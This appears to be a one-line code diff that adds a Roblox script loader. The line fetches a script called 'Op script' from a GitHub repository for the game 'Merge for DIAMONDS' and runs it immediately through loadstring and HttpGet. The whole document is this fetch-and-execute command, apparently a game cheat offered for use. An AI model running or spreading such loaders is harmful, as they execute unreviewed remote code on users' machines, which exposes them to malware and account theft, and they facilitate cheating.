@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaitofyp/Merge-for-DIAMONDS-/main/Op%20script"))()
